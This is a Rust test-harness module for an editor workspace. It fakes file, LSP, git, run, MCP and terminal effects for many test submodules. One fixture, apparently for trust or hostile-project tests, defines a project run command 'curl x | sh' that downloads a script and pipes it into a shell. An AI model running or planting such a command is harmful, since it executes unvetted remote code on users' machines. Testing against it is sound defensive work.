use crate::core::git_command::{GitEffect, GitEvent};
use crate::core::lsp_command::{LspEffect, LspEvent};
use std::path::{Path, PathBuf};

use super::*;
use crate::core::run_state::{RunEffect, RunEvent};
use crate::core::terminal::{TerminalEffect, TerminalEvent};
use crate::core::{
    ClosedPlan, DiffKind, DiffRow, FilePlan, FindOptions, GitBranch, GitCommit, Language,
    LspAnswer, LspLocation, LspUsage, Query, ReplacePreview, ReplaceReport, ReplaceStage,
    ServerKey,
};

const ROOT: &str = "/proj";

fn rust_server() -> ServerKey {
    server_at(Language::Rust, ROOT)
}

fn server_at(server: Language, root: &str) -> ServerKey {
    ServerKey {
        server,
        root: PathBuf::from(root),
    }
}

struct Harness {
    ws: Workspace,
    files: Vec<(PathBuf, String)>,
    written: Vec<(PathBuf, Vec<u8>)>,
    fail_writes: bool,
    conflict_on_write: Option<Option<DiskState>>,
    swaps: Vec<(PathBuf, Option<Vec<u8>>)>,
    snapshots: Vec<(SnapshotLabel, Vec<u8>)>,
    history_reads: Vec<String>,
    lsp: Vec<Effect>,
    journal: Vec<Effect>,
    git: Vec<Effect>,
    run_facts: crate::core::run::RunFacts,
    runs: Vec<Effect>,
}

impl Harness {
    fn new(files: &[(&str, &str)]) -> Self {
        let (ws, _) = Workspace::new(PathBuf::from(ROOT));
        Self {
            ws,
            files: files
                .iter()
                .map(|(p, t)| (Path::new(ROOT).join(p), (*t).to_owned()))
                .collect(),
            written: Vec::new(),
            fail_writes: false,
            conflict_on_write: None,
            swaps: Vec::new(),
            snapshots: Vec::new(),
            history_reads: Vec::new(),
            lsp: Vec::new(),
            journal: Vec::new(),
            git: Vec::new(),
            run_facts: crate::core::run::RunFacts::default(),
            runs: Vec::new(),
        }
    }

    fn run(&mut self, command: Command) {
        let effects = self.ws.dispatch(command);
        self.perform(effects);
    }

    fn perform(&mut self, effects: Vec<Effect>) {
        for effect in effects {
            let event = match effect {
                Effect::ReadFile { path, at } => {
                    let found = self.files.iter().find(|(p, _)| *p == path);
                    let result = Ok(found.map(|(_, t)| t.as_bytes().to_vec()));
                    Event::FileRead {
                        path,
                        at,
                        disk: None,
                        result,
                    }
                }
                Effect::WriteFile {
                    doc,
                    version,
                    path,
                    bytes,
                    guard,
                    origin,
                } => {
                    if let (Some(disk), WriteGuard::Unchanged(_)) = (self.conflict_on_write, guard)
                    {
                        Event::WriteConflict { doc, disk, origin }
                    } else if self.fail_writes {
                        Event::WriteFailed {
                            doc,
                            version,
                            message: "Disk full".into(),
                            origin,
                        }
                    } else {
                        self.written.push((path, bytes));
                        Event::FileWritten {
                            doc,
                            version,
                            disk: None,
                            origin,
                        }
                    }
                }
                Effect::WriteSwap { path, contents, .. } => {
                    self.swaps.push((path, Some(contents)));
                    continue;
                }
                Effect::FileOp(_)
                | Effect::SaveTrust { .. }
                | Effect::ScratchCreate { .. }
                | Effect::ScratchList
                | Effect::SaveRunHistory { .. }
                | Effect::FormatWithTool { .. }
                | Effect::OpenProject { .. }
                | Effect::McpReadFiles { .. }
                | Effect::McpReply { .. }
                | Effect::OpenClaude { .. }
                | Effect::ClaudeStart { .. }
                | Effect::Terminal(_)
                | Effect::ClaudeWrite { .. }
                | Effect::ClaudeResize { .. }
                | Effect::IdeNotify { .. }
                | Effect::Git(GitEffect::Status { .. })
                | Effect::Git(GitEffect::Log { .. })
                | Effect::Git(GitEffect::CommitFiles { .. })
                | Effect::Git(GitEffect::Diff { .. })
                | Effect::Git(GitEffect::Commit { .. })
                | Effect::Git(GitEffect::Remote { .. })
                | Effect::Git(GitEffect::ReadLastCommit { .. })
                | Effect::Git(GitEffect::Rollback { .. })
                | Effect::Git(GitEffect::ListBranches { .. })
                | Effect::Git(GitEffect::Switch { .. })
                | Effect::Git(GitEffect::Base { .. })
                | Effect::Git(GitEffect::FileHistory { .. })
                | Effect::Coverage(crate::core::coverage::CoverageEffect::Read { .. })
                | Effect::Duplicates(crate::core::DuplicatesEffect::Start { .. })
                | Effect::Duplicates(crate::core::DuplicatesEffect::Stop)
                | Effect::Git(GitEffect::Compare { .. })
                | Effect::Git(GitEffect::CommitChecks { .. })
                | Effect::Git(GitEffect::Op { .. })
                | Effect::Git(GitEffect::ListStashes { .. })
                | Effect::Git(GitEffect::Hunks { .. })
                | Effect::Git(GitEffect::ApplyHunk { .. })
                | Effect::Git(GitEffect::StageFiles { .. })
                | Effect::Git(GitEffect::CommitStaged { .. })
                | Effect::Git(GitEffect::Blame { .. }) => {
                    self.git.push(effect);
                    continue;
                }
                Effect::OpenInMainWindow { .. }
                | Effect::OpenGitWindow { .. }
                | Effect::OpenRunWindow { .. }
                | Effect::RunStreamSend(_)
                | Effect::RunStreamStart(_)
                | Effect::RunFollow { .. } => {
                    self.git.push(effect);
                    continue;
                }
                Effect::CheckFile { .. } | Effect::ListDir { .. } | Effect::IndexFiles { .. } => {
                    continue;
                }
                Effect::JournalAppend { .. } | Effect::RemoveJournal { .. } => {
                    self.journal.push(effect);
                    continue;
                }
                Effect::RemoveSwap { path } => {
                    self.swaps.push((path, None));
                    continue;
                }
                Effect::Lsp(LspEffect::FindRoot {
                    path,
                    server,
                    project,
                }) => {
                    let exists = |p: &Path| self.files.iter().any(|(f, _)| f == p);
                    let has_line = |p: &Path, start: &str| {
                        self.files
                            .iter()
                            .any(|(f, t)| f == p && t.lines().any(|l| l.starts_with(start)))
                    };
                    let root = server
                        .server()
                        .and_then(|s| s.find_root(&path, &project, &exists, &has_line))
                        .unwrap_or(project);
                    Event::Lsp(LspEvent::RootFound {
                        path,
                        server: ServerKey { server, root },
                    })
                }
                Effect::Lsp(LspEffect::Start { .. })
                | Effect::Lsp(LspEffect::Restart { .. })
                | Effect::Lsp(LspEffect::DidOpen { .. })
                | Effect::Lsp(LspEffect::DidChange { .. })
                | Effect::Lsp(LspEffect::DidSave { .. })
                | Effect::Lsp(LspEffect::DidClose { .. })
                | Effect::Lsp(LspEffect::Query { .. })
                | Effect::Lsp(LspEffect::Cancel { .. })
                | Effect::Lsp(LspEffect::ListServers)
                | Effect::WriteClipboard { .. }
                | Effect::ReadClipboard
                | Effect::Lsp(LspEffect::SelectServer(_)) => {
                    self.lsp.push(effect);
                    continue;
                }
                Effect::Snapshot { bytes, label, .. } => {
                    self.snapshots.push((label, bytes));
                    continue;
                }
                Effect::ReadHistoryVersion { hash } => {
                    self.history_reads.push(hash);
                    continue;
                }
                Effect::Run(RunEffect::Detect { .. }) => Event::Run(RunEvent::FactsRead {
                    facts: self.run_facts.clone(),
                }),
                Effect::Run(RunEffect::Start { .. }) | Effect::Run(RunEffect::Stop { .. }) => {
                    self.runs.push(effect);
                    continue;
                }
                Effect::RunPlugin { .. } => {
                    self.lsp.push(effect);
                    continue;
                }
                Effect::IndexProject { .. }
                | Effect::RescanIndex
                | Effect::QuerySymbols { .. }
                | Effect::FileSymbols { .. } => continue,
                Effect::LoadGrammar { .. } => continue,
                other => panic!("unexpected effect {other:?}"),
            };
            let more = self.ws.handle(event);
            self.perform(more);
        }
    }

    fn open(&mut self, path: &str) {
        self.run(Command::OpenFile {
            path: PathBuf::from(path),
            at: None,
        });
    }

    fn act(&mut self, action: Action) {
        self.run(Command::Run(action));
    }

    fn typed(&mut self, s: &str) {
        for c in s.chars() {
            self.run(Command::Insert(c.to_string()));
        }
    }

    fn active_text(&self) -> String {
        self.ws
            .active()
            .map(|(_, d)| d.text().to_string())
            .unwrap_or_default()
    }

    fn active_name(&self) -> String {
        self.ws
            .active()
            .map(|(_, d)| d.file_name())
            .unwrap_or_default()
    }

    fn tab_names(&self) -> Vec<String> {
        let pane = self.ws.pane(self.ws.active_pane()).unwrap();
        pane.views
            .iter()
            .map(|v| {
                self.ws
                    .document(self.ws.view(*v).unwrap().doc)
                    .unwrap()
                    .file_name()
            })
            .collect()
    }
}

const OTHER: DiskState = DiskState {
    modified: None,
    len: 999,
};

impl Harness {
    fn active_doc(&self) -> DocumentId {
        self.ws.active().unwrap().0.doc
    }

    fn file_changed(&mut self, text: &str) {
        let event = Event::FileChanged {
            doc: self.active_doc(),
            disk: Some(OTHER),
            result: Ok(Some(text.as_bytes().to_vec())),
        };
        let more = self.ws.handle(event);
        self.perform(more);
    }

    fn file_deleted(&mut self) {
        let event = Event::FileChanged {
            doc: self.active_doc(),
            disk: None,
            result: Ok(None),
        };
        let more = self.ws.handle(event);
        self.perform(more);
    }

    fn conflict(&self) -> Option<Conflict> {
        self.ws.active().unwrap().1.conflict()
    }

    fn dirty(&self) -> bool {
        self.ws.active().unwrap().1.is_dirty()
    }
}

fn recovered(base_len: Option<u64>, current_len: Option<u64>) -> RecoveredSwap {
    let state = |len| DiskState {
        modified: None,
        len,
    };
    RecoveredSwap {
        path: Path::new(ROOT).join("a.rs"),
        base: base_len.map(state),
        current: current_len.map(state),
        on_disk: current_len.map(|_| b"disk".to_vec()),
        contents: b"unsaved".to_vec(),
    }
}

impl Harness {
    fn restart(&mut self) -> Harness {
        let fx = self.ws.dispatch(Command::SaveSession);
        let [Effect::WriteSession(session)] = fx.as_slice() else {
            panic!("{fx:?}");
        };
        let mut next = Harness::new(&[]);
        next.files = self.files.clone();
        let files = session
            .paths()
            .into_iter()
            .map(|path| SessionFile {
                result: Ok(self
                    .files
                    .iter()
                    .find(|(p, _)| *p == path)
                    .map(|(_, t)| t.as_bytes().to_vec())),
                disk: None,
                path,
            })
            .collect();
        next.ws.handle(Event::SessionLoaded {
            session: session.clone(),
            files,
        });
        next
    }

    fn cursor(&self) -> usize {
        self.ws.active().unwrap().0.cursor.idx
    }
}

impl Harness {
    fn open_history(&mut self, hashes: &[&str]) {
        let entries = hashes
            .iter()
            .map(|h| HistoryEntry {
                timestamp: 100,
                path: Path::new(ROOT).join("a.rs"),
                hash: (*h).to_owned(),
                label: SnapshotLabel::Autosave,
            })
            .collect();
        let doc = self.active_doc();
        let more = self.ws.handle(Event::HistoryListed {
            doc,
            entries,
            now: 200,
        });
        self.perform(more);
    }

    fn version_read(&mut self, hash: &str, text: &str) {
        self.ws.handle(Event::HistoryVersion {
            hash: hash.to_owned(),
            result: Ok(text.as_bytes().to_vec()),
        });
    }
}

impl Harness {
    fn lsp_event(&mut self, event: Event) {
        let more = self.ws.handle(event);
        self.perform(more);
    }

    fn lsp_names(&self) -> Vec<&'static str> {
        self.lsp
            .iter()
            .map(|e| match e {
                Effect::Lsp(LspEffect::Start { .. }) => "start",
                Effect::Lsp(LspEffect::Restart { .. }) => "restart",
                Effect::Lsp(LspEffect::DidOpen { .. }) => "open",
                Effect::Lsp(LspEffect::DidChange { .. }) => "change",
                Effect::Lsp(LspEffect::DidSave { .. }) => "save",
                Effect::Lsp(LspEffect::DidClose { .. }) => "close",
                _ => "other",
            })
            .collect()
    }

    fn publish(&mut self, name: &str, start: (u32, u32), end: (u32, u32)) {
        self.lsp_event(Event::Lsp(LspEvent::Diagnostics {
            server: rust_server(),
            path: Path::new(ROOT).join(name),
            items: vec![RawDiagnostic {
                severity: Severity::Error,
                message: "bad".into(),
                start,
                end,
            }],
        }));
    }
}

impl Harness {
    fn ask_definition(&mut self, name: &str) -> u64 {
        self.open(name);
        self.lsp_event(Event::Lsp(LspEvent::Ready {
            server: rust_server(),
            encoding: PositionEncoding::Utf8,
            completion_triggers: vec![".".to_owned()],
        }));
        self.act(Action::GotoDefinition);
        self.last_query()
    }

    fn last_query(&self) -> u64 {
        self.lsp
            .iter()
            .rev()
            .find_map(|e| match e {
                Effect::Lsp(LspEffect::Query { id, .. }) => Some(*id),
                _ => None,
            })
            .expect("a query was sent")
    }

    fn answer(&mut self, id: u64, locations: Vec<LspLocation>) {
        self.lsp_event(Event::Lsp(LspEvent::Answered {
            server: rust_server(),
            id,
            result: Ok(LspAnswer::Locations(locations)),
        }));
    }
}

fn location(name: &str, line: u32, character: u32) -> LspLocation {
    LspLocation {
        path: Path::new(ROOT).join(name),
        start: (line, character),
    }
}

impl Harness {
    fn ask_hover(&mut self, name: &str) -> u64 {
        self.open(name);
        self.lsp_event(Event::Lsp(LspEvent::Ready {
            server: rust_server(),
            encoding: PositionEncoding::Utf8,
            completion_triggers: vec![".".to_owned()],
        }));
        self.act(Action::QuickDocumentation);
        self.last_query()
    }

    fn answer_hover(&mut self, id: u64, markdown: Option<&str>) {
        self.lsp_event(Event::Lsp(LspEvent::Answered {
            server: rust_server(),
            id,
            result: Ok(LspAnswer::Hover(markdown.map(str::to_owned))),
        }));
    }

    fn hover_texts(&self) -> Vec<String> {
        let lines = self.ws.hover().map_or(&[][..], |h| h.lines.as_slice());
        lines.iter().map(|l| l.text.clone()).collect()
    }
}

fn item(label: &str) -> LspCompletion {
    LspCompletion {
        label: label.to_owned(),
        detail: None,
        filter: label.to_owned(),
        sort: label.to_owned(),
        insert: label.to_owned(),
        start: None,
        additional: Vec::new(),
        resolve: None,
    }
}

impl Harness {
    fn ready(&mut self, name: &str) {
        self.open(name);
        self.lsp_event(Event::Lsp(LspEvent::Ready {
            server: rust_server(),
            encoding: PositionEncoding::Utf8,
            completion_triggers: vec![".".to_owned()],
        }));
    }

    fn answer_completion(&mut self, items: Vec<LspCompletion>, incomplete: bool) {
        let id = self.last_query();
        self.lsp_event(Event::Lsp(LspEvent::Answered {
            server: rust_server(),
            id,
            result: Ok(LspAnswer::Completion { items, incomplete }),
        }));
    }

    fn popup_labels(&self) -> Vec<String> {
        let Some(c) = self.ws.completion() else {
            return Vec::new();
        };
        c.matches
            .iter()
            .map(|m| c.items[m.index].label.clone())
            .collect()
    }

    fn query_count(&self) -> usize {
        self.lsp
            .iter()
            .filter(|e| matches!(e, Effect::Lsp(LspEffect::Query { .. })))
            .count()
    }

    fn popup(&mut self, text: &str, labels: &[&str]) {
        self.files
            .push((Path::new(ROOT).join("c.rs"), text.to_owned()));
        self.ready("c.rs");
        self.run(Command::Move(Motion::LineEnd));
        self.act(Action::Completion);
        let items = labels
            .iter()
            .enumerate()
            .map(|(n, l)| LspCompletion {
                sort: format!("{n:02}"),
                ..item(l)
            })
            .collect();
        self.answer_completion(items, false);
    }
}

fn server_options() -> Vec<LspServerOption> {
    let option = |label: &str, choice, current| LspServerOption {
        label: label.to_owned(),
        choice,
        current,
    };
    vec![
        option("Automatic", ServerChoice::Automatic, true),
        option(
            "2025-12-08",
            ServerChoice::Release("2025-12-08".into()),
            false,
        ),
    ]
}

fn usage(name: &str, line: u32, character: u32, disk_line: &str) -> LspUsage {
    LspUsage {
        location: location(name, line, character),
        disk_line: disk_line.to_owned(),
    }
}

impl Harness {
    fn answer_usages(&mut self, usages: Vec<LspUsage>) {
        let id = self.last_query();
        self.lsp_event(Event::Lsp(LspEvent::Answered {
            server: rust_server(),
            id,
            result: Ok(LspAnswer::References(usages)),
        }));
    }

    fn answer_edits(&mut self, edits: Vec<LspTextEdit>) {
        let id = self.last_query();
        self.lsp_event(Event::Lsp(LspEvent::Answered {
            server: rust_server(),
            id,
            result: Ok(LspAnswer::Edits(edits)),
        }));
    }
}

fn inserted(start: (u32, u32), text: &str) -> LspTextEdit {
    LspTextEdit {
        start,
        end: start,
        text: text.to_owned(),
    }
}

fn code_action(title: &str, changes: &[(&str, (u32, u32), &str)]) -> LspCodeAction {
    LspCodeAction {
        title: title.to_owned(),
        changes: changes
            .iter()
            .map(|(name, at, text)| LspFileEdit {
                path: Path::new(ROOT).join(name),
                edits: vec![inserted(*at, text)],
            })
            .collect(),
    }
}

impl Harness {
    fn offer_actions(&mut self, actions: Vec<LspCodeAction>) {
        self.act(Action::ContextActions);
        let id = self.last_query();
        self.lsp_event(Event::Lsp(LspEvent::Answered {
            server: rust_server(),
            id,
            result: Ok(LspAnswer::CodeActions(actions)),
        }));
    }

    fn text_of(&self, name: &str) -> Option<String> {
        let path = Path::new(ROOT).join(name);
        self.ws
            .pane(self.ws.active_pane())?
            .views
            .iter()
            .filter_map(|v| self.ws.view(*v))
            .filter_map(|v| self.ws.document(v.doc))
            .find(|d| d.path() == path)
            .map(|d| d.text().to_string())
    }
}

impl Harness {
    fn selected(&self) -> Option<String> {
        let (view, d) = self.ws.active()?;
        let span = view.cursor.selection()?;
        Some(d.text().slice(span).to_string())
    }

    fn copied(&self) -> Option<&str> {
        self.lsp.iter().rev().find_map(|e| match e {
            Effect::WriteClipboard { text } => Some(text.as_str()),
            _ => None,
        })
    }

    fn pasted(&mut self, text: Option<&str>) {
        self.lsp_event(Event::ClipboardRead {
            text: text.map(str::to_owned),
        });
    }
}

impl Harness {
    fn replacing(text: &str, query: &str, replacement: &str) -> Self {
        let mut h = Harness::new(&[("a.txt", text)]);
        h.open("a.txt");
        h.act(Action::Replace);
        h.typed(query);
        h.run(Command::Indent);
        h.typed(replacement);
        h
    }
}

impl Harness {
    fn journal_log(&self) -> Vec<(bool, usize)> {
        self.journal
            .iter()
            .filter_map(|e| match e {
                Effect::JournalAppend { start, changes, .. } => {
                    Some((start.is_some(), changes.len()))
                }
                _ => None,
            })
            .collect()
    }

    fn journal_removed(&self) -> usize {
        self.journal
            .iter()
            .filter(|e| matches!(e, Effect::RemoveJournal { .. }))
            .count()
    }
}

fn git_file(path: &str, change: GitChange) -> GitFile {
    GitFile::new(PathBuf::from(path), change)
}

fn git_commit(hash: &str, parents: &[&str]) -> GitCommit {
    GitCommit {
        hash: hash.to_owned(),
        parents: parents.iter().map(|p| (*p).to_owned()).collect(),
        author: "Ann".to_owned(),
        time: 100,
        refs: Vec::new(),
        subject: format!("subject {hash}"),
    }
}

impl Harness {
    fn git_status(&mut self, files: Vec<GitFile>) {
        self.lsp_event(Event::Git(GitEvent::StatusRead {
            branch: Some("main".into()),
            top: Some(PathBuf::from("/repo")),
            files: Ok(files),
            state: crate::core::GitRepoState::default(),
        }));
    }

    fn git_log(&mut self, commits: Vec<GitCommit>) {
        self.lsp_event(Event::Git(GitEvent::LogRead {
            result: Ok(commits),
            now: 200,
        }));
    }

    fn panel(&self) -> &GitPanel {
        self.ws.git_panel().expect("the git panel")
    }

    fn last_diff(&self) -> Option<(u64, GitDiffSource)> {
        self.git.iter().rev().find_map(|e| match e {
            Effect::Git(GitEffect::Diff { id, source, .. }) => Some((*id, source.clone())),
            _ => None,
        })
    }

    fn last_hunks(&self) -> Option<(u64, GitFile)> {
        self.git.iter().rev().find_map(|e| match e {
            Effect::Git(GitEffect::Hunks { id, file, .. }) => Some((*id, file.clone())),
            _ => None,
        })
    }

    fn commit_sent(&self) -> Option<(String, Vec<PathBuf>, Vec<PathBuf>)> {
        self.git.iter().rev().find_map(|e| match e {
            Effect::Git(GitEffect::Commit {
                message,
                paths,
                untracked,
                ..
            }) => Some((message.clone(), paths.clone(), untracked.clone())),
            _ => None,
        })
    }

    fn commit_view(&mut self, files: Vec<GitFile>) {
        self.act(Action::GitCommit);
        self.git_status(files);
    }

    fn log_view(&mut self, commits: Vec<GitCommit>) {
        self.act(Action::GitLog);
        self.git_log(commits);
    }
}

fn git_branch(name: &str, remote: bool) -> GitBranch {
    GitBranch {
        name: name.to_owned(),
        remote,
    }
}

fn commits_loaded(h: &Harness) -> usize {
    h.git
        .iter()
        .filter(|e| matches!(e, Effect::Git(GitEffect::CommitFiles { .. })))
        .count()
}

fn added_row(text: &str) -> DiffRow {
    DiffRow {
        kind: DiffKind::Added,
        old_line: None,
        new_line: Some(1),
        text: text.to_owned(),
    }
}

impl Harness {
    fn picker_labels(&self) -> Vec<String> {
        let picker = self.ws.picker().expect("a picker is open");
        let items = self.ws.picker_items(picker.kind);
        picker
            .matches
            .iter()
            .map(|m| items[m.index].clone())
            .collect()
    }
}

fn indexed(h: &mut Harness, names: &[&str]) {
    let files = names.iter().map(|n| Path::new(ROOT).join(n)).collect();
    let fx = h.ws.handle(Event::FilesIndexed { files });
    h.perform(fx);
}

impl Harness {
    fn wrapped(files: &[(&str, &str)], cols: usize) -> Self {
        let mut h = Harness::new(files);
        h.ws.configure_editor(4, true);
        h.run(Command::Viewport { text_cols: cols });
        h.open(files[0].0);
        h
    }

    fn at_each_press(&mut self, motion: Motion, times: usize) -> Vec<usize> {
        (0..times)
            .map(|_| {
                self.run(Command::Move(motion));
                self.cursor()
            })
            .collect()
    }
}

impl Harness {
    fn find(&mut self, query: &str) {
        self.act(Action::Find);
        self.typed(query);
    }

    fn matches(&self) -> Vec<std::ops::Range<usize>> {
        self.ws.find_bar().unwrap().matches.clone()
    }

    fn replace_in_bar(&mut self, query: &str, with: &str) {
        self.act(Action::Replace);
        self.typed(query);
        self.run(Command::Indent);
        self.typed(with);
    }
}

impl Harness {
    fn searched(&mut self, query: &str, files: &[&str]) {
        self.act(Action::FindInProject);
        self.typed(query);
        let fx = self.ws.dispatch(Command::Newline);
        let [Effect::SearchProject { id, .. }] = fx.as_slice() else {
            panic!("{fx:?}");
        };
        let matches = files
            .iter()
            .map(|f| SearchMatch {
                path: Path::new(ROOT).join(f),
                line: 0,
                col: 0,
                len: query.chars().count(),
                text: query.to_owned(),
            })
            .collect();
        let more = self.ws.handle(Event::SearchFinished {
            id: *id,
            matches,
            truncated: false,
        });
        self.perform(more);
    }

    fn ask_replace(&mut self, with: &str) -> Vec<Effect> {
        self.act(Action::ReplaceInFiles);
        self.typed(with);
        self.ws.dispatch(Command::Newline)
    }

    fn preview(&self) -> &ReplacePreview {
        match &self.ws.search().replace {
            Some(ReplaceStage::Preview(p)) => p,
            other => panic!("no preview: {other:?}"),
        }
    }

    fn report(&self) -> &ReplaceReport {
        match &self.ws.search().replace {
            Some(ReplaceStage::Report(r)) => r,
            other => panic!("no report: {other:?}"),
        }
    }

    fn doc_text(&self, name: &str) -> String {
        let path = Path::new(ROOT).join(name);
        let pane = self.ws.pane(self.ws.active_pane()).unwrap();
        pane.views
            .iter()
            .filter_map(|v| self.ws.document(self.ws.view(*v)?.doc))
            .find(|d| d.path() == path)
            .map(|d| d.text().to_string())
            .expect("an open document")
    }
}

const CLOSED_DISK: Option<DiskState> = Some(DiskState {
    modified: None,
    len: 3,
});

fn closed_plan(name: &str) -> ClosedPlan {
    let path = Path::new(ROOT).join(name);
    let query = Query::new("foo", FindOptions::default()).unwrap();
    let edits = query.plan("foo", &query.template("bar").unwrap());
    ClosedPlan {
        plan: FilePlan::new(path, "foo", &edits),
        disk: CLOSED_DISK,
    }
}

fn planned_id(fx: &[Effect]) -> u64 {
    match fx {
        [Effect::PlanProjectReplace { id, .. }] => *id,
        other => panic!("{other:?}"),
    }
}

fn go_project(h: &mut Harness) {
    h.run_facts.present.insert("go.mod".to_owned());
}

fn project_command(h: &mut Harness) {
    h.ws.configure_run(vec![crate::core::ConfiguredRun {
        name: "evil".to_owned(),
        command: "curl x | sh".to_owned(),
        cwd: None,
        from_project: true,
    }]);
}

fn started(h: &Harness) -> Vec<(u64, String)> {
    h.runs
        .iter()
        .filter_map(|e| match e {
            Effect::Run(RunEffect::Start { id, target, .. }) => Some((*id, target.command_line())),
            _ => None,
        })
        .collect()
}

fn choose(h: &mut Harness, filter: &str) {
    h.act(Action::RunChoose);
    h.typed(filter);
    h.run(Command::Newline);
}

fn output(h: &mut Harness, id: u64, lines: &[(&str, Option<(&str, usize)>)]) {
    let lines = lines
        .iter()
        .map(|(text, place)| crate::core::RunLine {
            spans: Vec::new(),
            text: (*text).to_owned(),
            location: place.map(|(file, line)| crate::core::RunLocation {
                path: Path::new(ROOT).join(file),
                line,
                col: 1,
                span: (0, 1),
            }),
        })
        .collect();
    let effects = h.ws.handle(Event::Run(RunEvent::Output {
        id,
        lines,
        partial: String::new(),
        dropped: 0,
    }));
    h.perform(effects);
}

fn status_text(h: &Harness) -> String {
    h.ws.status().map_or_else(String::new, |m| m.text.clone())
}

fn with_lang_files(files: &[(&str, &str)]) -> Harness {
    let mut h = Harness::new(files);
    for (name, _) in files {
        if !name.ends_with("go.mod") && !name.ends_with("package.json") {
            h.run(Command::OpenFile {
                path: Path::new(ROOT).join(name),
                at: None,
            });
        }
    }
    h
}

fn ready(h: &mut Harness, server: ServerKey) {
    h.lsp_event(Event::Lsp(LspEvent::Ready {
        server,
        encoding: PositionEncoding::Utf8,
        completion_triggers: vec![".".to_owned()],
    }));
}

fn sessions_started(h: &Harness) -> Vec<ServerKey> {
    h.lsp
        .iter()
        .filter_map(|e| match e {
            Effect::Lsp(LspEffect::Start { server }) => Some(server.clone()),
            _ => None,
        })
        .collect()
}

mod analysis_tests;
mod claude_tests;
mod code_action_tests;
mod completion_tests;
mod coverage_tests;
mod database_tests;
mod definition_tests;
mod disk_tests;
mod docker_tests;
mod duplicates_tests;
mod editor_tests;
mod file_menu_tests;
mod find_options_tests;
mod format_tool_tests;
mod git_compare_tests;
mod git_ops_tests;
mod git_panel_tests;
mod github_tests;
mod hostile_tests;
mod hover_tests;
mod http_client;
mod imports_tests;
mod journal_tests;
mod local_history_tests;
mod lsp_sessions_tests;
mod lsp_sync_tests;
mod markdown_tests;
mod mcp_tests;
mod plugins_tests;
mod project_symbols_tests;
mod refactor_tests;
mod rename_tests;
mod rename_undo_tests;
mod replace_in_files_tests;
mod replace_indent_tests;
mod run_tabs_tests;
mod run_tests;
mod search_everywhere_tests;
mod selection_tests;
mod server_choice_tests;
mod session_tests;
mod settings_tests;
mod swap_tests;
mod symbols_tests;
mod templates_tests;
mod terminal_tests;
mod tool_window_tests;
mod trust_tests;
mod usages_format_tests;
mod wrap_tests;

const FO_ROOT: &str = ROOT;

impl Harness {
    fn last_file_op(&mut self) -> Option<crate::core::file_op::FileOp> {
        self.git.iter().rev().find_map(|e| match e {
            Effect::FileOp(op) => Some(op.clone()),
            _ => None,
        })
    }

    fn file_op_ok(&mut self) {
        let op = self.last_file_op().expect("asked");
        if let crate::core::file_op::FileOp::NewFile(path) = &op {
            self.files.push((path.clone(), String::new()));
        }
        if let crate::core::file_op::FileOp::Rename { to, .. } = &op {
            self.files.push((to.clone(), "moved".to_owned()));
        }
        self.lsp_event(Event::FileOpDone { op, result: Ok(()) });
    }

    fn typed_prompt(&mut self, text: &str) {
        for c in text.chars() {
            self.run(Command::Insert(c.to_string()));
        }
    }
}

impl Harness {
    fn mcp(&mut self, id: u64, tool: &str, args: serde_json::Value) {
        self.lsp_event(Event::McpCalled {
            id,
            tool: tool.to_owned(),
            args,
        });
    }

    fn mcp_answer(&self, wanted: u64) -> Option<Result<String, String>> {
        self.git.iter().rev().find_map(|e| match e {
            Effect::McpReply { id, result } if *id == wanted => Some(result.clone()),
            _ => None,
        })
    }

    fn mcp_json(&self, wanted: u64) -> serde_json::Value {
        let text = self
            .mcp_answer(wanted)
            .expect("answered")
            .expect("no error");
        serde_json::from_str(&text).expect("json")
    }

    fn propose(&mut self, id: u64, path: &str, old: &str, new: &str) {
        self.mcp(
            id,
            "propose_edit",
            serde_json::json!({
                "summary": "why",
                "edits": [{ "path": path, "old_text": old, "new_text": new }],
            }),
        );
    }
}

impl Harness {
    fn claude_up(&mut self) {
        self.act(Action::ClaudeOpen);
        self.run(Command::ClaudeSize {
            rows: 10,
            columns: 60,
        });
    }

    fn notified(&self, wanted: &str) -> Vec<serde_json::Value> {
        self.git
            .iter()
            .filter_map(|e| match e {
                Effect::IdeNotify { method, params } if method == wanted => Some(params.clone()),
                _ => None,
            })
            .collect()
    }

    fn written_to_claude(&self) -> Vec<Vec<u8>> {
        self.git
            .iter()
            .filter_map(|e| match e {
                Effect::ClaudeWrite { bytes } => Some(bytes.clone()),
                _ => None,
            })
            .collect()
    }
}

fn open_diff(h: &mut Harness, id: u64, contents: &str) {
    h.mcp(
        id,
        "openDiff",
        serde_json::json!({
            "old_file_path": format!("{ROOT}/a.rs"),
            "new_file_path": format!("{ROOT}/a.rs"),
            "new_file_contents": contents,
            "tab_name": "edit a.rs",
        }),
    );
}

impl Harness {
    fn terminal_starts(&self) -> Vec<u32> {
        self.git
            .iter()
            .filter_map(|e| match e {
                Effect::Terminal(TerminalEffect::Start { id, .. }) => Some(*id),
                _ => None,
            })
            .collect()
    }

    fn terminal_titles(&self) -> Vec<String> {
        self.ws
            .terminal_tabs()
            .iter()
            .map(|t| t.title.clone())
            .collect()
    }
}

impl Harness {
    fn run_named(&mut self, name: &str) {
        self.ws.configure_run(vec![crate::core::ConfiguredRun {
            name: name.to_owned(),
            command: format!("run {name}"),
            cwd: None,
            from_project: false,
        }]);
        self.act(Action::RunChoose);
        self.run(Command::SelectPickerItem {
            index: 0,
            accept: true,
        });
    }

    fn run_starts(&self) -> Vec<(u64, Option<u64>, String)> {
        self.runs
            .iter()
            .filter_map(|e| match e {
                Effect::Run(RunEffect::Start {
                    id,
                    replaces,
                    target,
                    ..
                }) => Some((*id, *replaces, target.name.clone())),
                _ => None,
            })
            .collect()
    }

    fn run_tab_names(&self) -> Vec<String> {
        self.ws
            .run_tabs()
            .iter()
            .map(|t| t.target.name.clone())
            .collect()
    }
}

fn template_index(label: &str) -> usize {
    crate::core::templates::FILE_TEMPLATES
        .iter()
        .position(|t| t.label == label)
        .expect("a template")
}

fn format_request(h: &Harness) -> Option<(crate::core::DocumentId, u64, String)> {
    h.git.iter().rev().find_map(|e| match e {
        Effect::FormatWithTool {
            doc, version, text, ..
        } => Some((*doc, *version, text.clone())),
        _ => None,
    })
}

impl Harness {
    fn answer_lsp(&mut self, answer: LspAnswer) {
        let id = self.last_query();
        self.lsp_event(Event::Lsp(LspEvent::Answered {
            server: rust_server(),
            id,
            result: Ok(answer),
        }));
    }

    fn last_lsp_query(&self) -> Option<LspQuery> {
        self.lsp.iter().rev().find_map(|e| match e {
            Effect::Lsp(LspEffect::Query { query, .. }) => Some(query.clone()),
            _ => None,
        })
    }
}

fn symbol(name: &str, depth: usize, line: u32) -> crate::core::lsp::LspSymbol {
    crate::core::lsp::LspSymbol {
        name: name.to_owned(),
        kind: "function".to_owned(),
        depth,
        start: (line, 0),
    }
}

